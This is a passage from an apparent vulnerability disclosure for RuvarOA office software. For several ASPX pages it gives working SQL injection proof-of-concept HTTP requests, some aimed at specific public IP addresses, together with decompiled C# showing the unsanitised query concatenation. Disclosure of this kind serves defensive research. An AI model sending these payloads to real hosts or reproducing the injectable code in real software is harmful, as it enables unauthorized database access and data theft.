0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /AddressBook/address_public_show.aspx?id=1+waitfor+delay+'0:0:3'+--+ HTTP/1.1
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.4103.116 Safari/537.36
Host: 121.33.254.78:88
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close


</code></pre>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-3" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-3"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function address_public_show within the DLL file /RuvarOA/bin/AddressBook.dll</p>
<pre><code>using System;
using System.Data;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using Lib;

namespace AddressBook;

public class address_public_show : Page
{
    protected HtmlForm form1;

    protected Literal txt_cm_name;

    protected Literal txt_type_name;

    protected Literal txt_cm_sez;

    protected Literal txt_cm_ename;

    protected Literal txt_cm_company;

    protected Literal txt_cm_nameas;

    protected Literal txt_cm_department_name;

    protected Literal txt_cm_wife;

    protected Literal txt_cm_position_name;

    protected Literal txt_cm_birth;

    protected Literal txt_cm_tel;

    protected Literal txt_cm_fax;

    protected Literal txt_cm_mobile;

    protected Literal txt_cm_tel1;

    protected Literal txt_cm_oicq;

    protected Literal txt_cm_msn;

    protected Literal txt_cm_email;

    protected Literal txt_cm_email1;

    protected Literal txt_cm_url;

    protected Literal txt_cm_companyurl;

    protected Literal txt_cm_address;

    protected Literal txt_cm_companyaddr;

    protected Literal txt_cm_postcode;

    protected Literal txt_cm_companycode;

    protected Literal txt_cm_interest;

    protected Literal txt_cm_memo;

    protected void Page_Load(object sender, EventArgs e)
    {
        Common.CheckSession();
        if (!Users.Check_Power(((Page)this).Session["sn_sys_userinfo_id"].ToString(), "1092", "6"))
        {
            Common.DealError(((Control)this).Page, "对不起，您没有访问权限！");
            ((Page)this).Response.End();
        }
        if (!((Page)this).IsPostBack)
        {
            string text = ((Page)this).Request.QueryString["id"];
            if (Validate.isNullOrSpace(text))
            {
                text = "0";
            }
            string sQLString = "select * from address_book where id=" + text;
            DataView dataView = SqlHelper.QueryView(sQLString);
            if (dataView.Count &gt; 0)
            {
                txt_type_name.Text = dataView[0]["type_name"].ToString();
                txt_cm_name.Text = dataView[0]["cm_name"].ToString();
                txt_cm_ename.Text = dataView[0]["cm_ename"].ToString();
                txt_cm_birth.Text = dataView[0]["cm_birth"].ToString();
                txt_cm_sez.Text = dataView[0]["cm_sex"].ToString();
                txt_cm_company.Text = dataView[0]["cm_company"].ToString();
                txt_cm_department_name.Text = dataView[0]["cm_department_name"].ToString();
                txt_cm_position_name.Text = dataView[0]["cm_position_name"].ToString();
                txt_cm_tel.Text = dataView[0]["cm_tel"].ToString();
                txt_cm_mobile.Text = dataView[0]["cm_mobile"].ToString();
                txt_cm_email.Text = dataView[0]["cm_email"].ToString();
                txt_cm_url.Text = dataView[0]["cm_url"].ToString();
                txt_cm_address.Text = dataView[0]["cm_address"].ToString();
                txt_cm_postcode.Text = dataView[0]["cm_postcode"].ToString();
                txt_cm_email1.Text = dataView[0]["cm_email1"].ToString();
                txt_cm_tel1.Text = dataView[0]["cm_tel1"].ToString();
                txt_cm_fax.Text = dataView[0]["cm_fax"].ToString();
                txt_cm_oicq.Text = dataView[0]["cm_oicq"].ToString();
                txt_cm_msn.Text = dataView[0]["cm_msn"].ToString();
                txt_cm_nameas.Text = dataView[0]["cm_nameas"].ToString();
                txt_cm_wife.Text = dataView[0]["cm_wife"].ToString();
                txt_cm_memo.Text = dataView[0]["cm_memo"].ToString();
                txt_cm_interest.Text = dataView[0]["cm_interest"].ToString();
                txt_cm_companyaddr.Text = dataView[0]["cm_companyaddr"].ToString();
                txt_cm_companyurl.Text = dataView[0]["cm_companyurl"].ToString();
                txt_cm_companycode.Text = dataView[0]["cm_companycode"].ToString();
            }
            dataView.Dispose();
        }
    }
}

</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">address_public_new.aspx</h3><a id="user-content-address_public_newaspx" class="anchor" aria-label="Permalink: address_public_new.aspx" href="#address_public_newaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-4" class="anchor" aria-label="Permalink: path" href="#path-4"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">AddressBook/address_public_new.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-4" class="anchor" aria-label="Permalink: POC" href="#poc-4"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /AddressBook/address_public_new.aspx?id=1+waitfor+delay+'0:0:3'+--+ HTTP/1.1
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.4103.116 Safari/537.36
Host: 118.190.16.8:8099
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: close



</code></pre>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-4" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-4"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function address_public_new within the DLL file /RuvarOA/bin/AddressBook.dll</p>
<pre><code>using System;
using System.Data;
using System.Data.Common;
using System.Data.SqlClient;
using System.Text;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using Lib;

namespace AddressBook;

public class address_public_new : Page
{
    protected HtmlForm form1;

    protected TextBox txt_cm_name;

    protected DropDownList ddl_type;

    protected RadioButtonList rd_cm_sex;

    protected TextBox txt_cm_ename;

    protected TextBox txt_cm_company;

    protected TextBox txt_cm_nameas;

    protected TextBox txt_cm_department_name;

    protected TextBox txt_cm_wife;

    protected TextBox txt_cm_position_name;

    protected TextBox txt_cm_birth;

    protected TextBox txt_cm_tel;

    protected TextBox txt_cm_fax;

    protected TextBox txt_cm_mobile;

    protected TextBox txt_cm_tel1;

    protected TextBox txt_cm_oicq;

    protected TextBox txt_cm_msn;

    protected TextBox txt_cm_email;

    protected TextBox txt_cm_email1;

    protected TextBox txt_cm_url;

    protected TextBox txt_cm_companyurl;

    protected TextBox txt_cm_address;

    protected TextBox txt_cm_companyaddr;

    protected TextBox txt_cm_postcode;

    protected TextBox txt_cm_companycode;

    protected TextBox txt_cm_interest;

    protected TextBox txt_cm_memo;

    protected Button btnSave;

    protected TextBox txt_id;

    protected void Page_Load(object sender, EventArgs e)
    {
        Common.CheckSession();
        if (!Users.Check_Power(((Page)this).Session["sn_sys_userinfo_id"].ToString(), "1092", "1"))
        {
            Common.DealError(((Control)this).Page, "对不起，您没有访问权限！");
            ((Page)this).Response.End();
        }
        if (!((Page)this).IsPostBack)
        {
            txt_id.Text = ((Page)this).Request.QueryString["id"];
            if (Validate.isNullOrSpace(txt_id.Text))
            {
                txt_id.Text = "0";
            }
            InitType();
            if (txt_id.Text != "0")
            {
                ShowInfo();
            }
            ((WebControl)btnSave).Attributes["onclick"] = "return checkSave();";
        }
    }

    private void InitType()
    {
        //IL_004a: Unknown result type (might be due to invalid IL or missing references)
        //IL_0054: Expected O, but got Unknown
        string sQLString = "select * from address_book_type where flag=0 order by type_order asc ";
        DataView dataView = SqlHelper.QueryView(sQLString);
        for (int i = 0; i &lt; dataView.Count; i++)
        {
            ((ListControl)ddl_type).Items.Add(new ListItem(dataView[i]["type_name"].ToString(), dataView[i]["id"].ToString()));
        }
        dataView.Dispose();
    }

    private void ShowInfo()
    {
        string sQLString = "select * from address_book where id=" + txt_id.Text;
        DataView dataView = SqlHelper.QueryView(sQLString);
        if (dataView.Count &gt; 0)
        {
            Common.SelectedItem(ddl_type, dataView[0]["type_id"].ToString());
            txt_cm_name.Text = dataView[0]["cm_name"].ToString();
            txt_cm_ename.Text = dataView[0]["cm_ename"].ToString();
            txt_cm_birth.Text = dataView[0]["cm_birth"].ToString();
            Common.SelectedItem(rd_cm_sex, dataView[0]["cm_sex"].ToString());
            txt_cm_company.Text = dataView[0]["cm_company"].ToString();
            txt_cm_department_name.Text = dataView[0]["cm_department_name"].ToString();
            txt_cm_position_name.Text = dataView[0]["cm_position_name"].ToString();
            txt_cm_tel.Text = dataView[0]["cm_tel"].ToString();
            txt_cm_mobile.Text = dataView[0]["cm_mobile"].ToString();
            txt_cm_email.Text = dataView[0]["cm_email"].ToString();
            txt_cm_email1.Text = dataView[0]["cm_email1"].ToString();
            txt_cm_tel1.Text = dataView[0]["cm_tel1"].ToString();
            txt_cm_url.Text = dataView[0]["cm_url"].ToString();
            txt_cm_address.Text = dataView[0]["cm_address"].ToString();
            txt_cm_postcode.Text = dataView[0]["cm_postcode"].ToString();
            txt_cm_fax.Text = dataView[0]["cm_fax"].ToString();
            txt_cm_oicq.Text = dataView[0]["cm_oicq"].ToString();
            txt_cm_msn.Text = dataView[0]["cm_msn"].ToString();
            txt_cm_nameas.Text = dataView[0]["cm_nameas"].ToString();
            txt_cm_wife.Text = dataView[0]["cm_wife"].ToString();
            txt_cm_memo.Text = dataView[0]["cm_memo"].ToString();
            txt_cm_interest.Text = dataView[0]["cm_interest"].ToString();
            txt_cm_companyaddr.Text = dataView[0]["cm_companyaddr"].ToString();
            txt_cm_companyurl.Text = dataView[0]["cm_companyurl"].ToString();
            txt_cm_companycode.Text = dataView[0]["cm_companycode"].ToString();
        }
        dataView.Dispose();
    }

</code></pre>
<p dir="auto">IF <code>Request.QueryString["id"]</code> value not equal 0 or null ,then go to ShowInfo() function.
The direct use of <code>Request.QueryString["id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">kaizen_download.aspx</h3><a id="user-content-kaizen_downloadaspx" class="anchor" aria-label="Permalink: kaizen_download.aspx" href="#kaizen_downloadaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-5" class="anchor" aria-label="Permalink: path" href="#path-5"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">CorporateCulture/kaizen_download.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-5" class="anchor" aria-label="Permalink: POC" href="#poc-5"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /CorporateCulture/kaizen_download.aspx?file_id=')+and+(select+@@version)&gt;0+--+(' HTTP/1.1
Host: 112.74.79.113:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.4103.116 Safari/537.36


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302572347-796ad889-73ed-454b-81cd-a47ce51cc8ee.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1NzIzNDctNzk2YWQ4ODktNzNlZC00NTRiLTgxY2QtYTQ3Y2U1MWNjOGVlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWU4MTA0MGE3MmQ5NjU5MGNmMDFmMzZkNmJlYTVlNzUwYmVkZDQwNWExYTQyYjIzY2NiMTE2ZGM2YWUxYTE0OGImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.zbHTi7HJVhHMQ3SOxli-FvvjD2cAgQT0SMYN9O46TF0"><img width="1063" alt="image" src="https://private-user-images.githubusercontent.com/18260135/302572347-796ad889-73ed-454b-81cd-a47ce51cc8ee.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1NzIzNDctNzk2YWQ4ODktNzNlZC00NTRiLTgxY2QtYTQ3Y2U1MWNjOGVlLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWU4MTA0MGE3MmQ5NjU5MGNmMDFmMzZkNmJlYTVlNzUwYmVkZDQwNWExYTQyYjIzY2NiMTE2ZGM2YWUxYTE0OGImWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.zbHTi7HJVhHMQ3SOxli-FvvjD2cAgQT0SMYN9O46TF0" style="max-width: 100%;"></a>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">Vulnerability analysis</h4><a id="user-content-vulnerability-analysis-5" class="anchor" aria-label="Permalink: Vulnerability analysis" href="#vulnerability-analysis-5"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<p dir="auto">function kaizen_download within the DLL file /RuvarOA/bin/CorporateCulture.dll</p>
<pre><code>using System;
using System.Data.Common;
using System.Data.SqlClient;
using System.Web.UI;
using Lib;

namespace CorporateCulture;

public class kaizen_download : Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        string text = ((Page)this).Request.QueryString["file_id"];
        string text2 = "select top 1 * from kaizen_list where (file_id='" + text + "')order by file_id desc";
        if (text2 != "")
        {
            SqlDataReader val = SqlHelper.ExecuteReader(text2);
            while (((DbDataReader)(object)val).Read())
            {
                byte[] array = new byte[((DbDataReader)(object)val).GetBytes(12, 0L, (byte[]?)null, 0, int.MaxValue)];
                ((DbDataReader)(object)val).GetBytes(12, 0L, array, 0, array.Length);
                ((Control)this).Page.Response.ContentType = ((DbDataReader)(object)val)["file_type"].ToString();
                ((Control)this).Page.Response.AddHeader("Content-Disposition", "filename=" + DateTime.Now.ToString("yyyyMMddHHmmss") + ((DbDataReader)(object)val)["file_ext"].ToString() + ";");
                ((Control)this).Page.Response.BinaryWrite(array);
            }
            ((DbDataReader)(object)val).Close();
        }
    }
}

</code></pre>
<p dir="auto">The direct use of <code>Request.QueryString["file_id"]</code> to retrieve a value and then concatenate it into an SQL statement has resulted in an SQL injection vulnerability.</p>
<div class="markdown-heading" dir="auto"><h3 class="heading-element" dir="auto">AttachDownLoad.aspx</h3><a id="user-content-attachdownloadaspx" class="anchor" aria-label="Permalink: AttachDownLoad.aspx" href="#attachdownloadaspx"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">path</h4><a id="user-content-path-6" class="anchor" aria-label="Permalink: path" href="#path-6"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<blockquote>
<p dir="auto">Mobile/Bulletin/AttachDownLoad.aspx</p>
</blockquote>
<div class="markdown-heading" dir="auto"><h4 class="heading-element" dir="auto">POC</h4><a id="user-content-poc-6" class="anchor" aria-label="Permalink: POC" href="#poc-6"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg></a></div>
<pre><code>GET /Mobile/Bulletin/AttachDownLoad.aspx?attach_id=1')+and+(select+@@version)&gt;0+--+(' HTTP/1.1
Host: 112.74.79.113:8000
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.4103.116 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-HK;q=0.8,zh-TW;q=0.7,zh-CN;q=0.6,zh;q=0.5
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7


</code></pre>
<a target="_blank" rel="noopener noreferrer" href="https://private-user-images.githubusercontent.com/18260135/302572723-239fe2cc-8ebe-480c-b81d-4c5e4ad051e9.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzY2MTY0NTksIm5iZiI6MTczNjYxNjE1OSwicGF0aCI6Ii8xODI2MDEzNS8zMDI1NzI3MjMtMjM5ZmUyY2MtOGViZS00ODBjLWI4MWQtNGM1ZTRhZDA1MWU5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTAxMTElMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwMTExVDE3MjIzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWM1OGFiNTE2NzIxZGE4M2ZiN2Y5ZWU5OGI0YmIwY2Q2ZmU5Zjc0YzBlZjc2MGEzOTJmMTlhOTljYTVmZDE5MjkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.7WnCdxLAQadh6a2YkUxIphhHgAHd83DHQip1mcG5C5g"><img width="1069" alt="image" 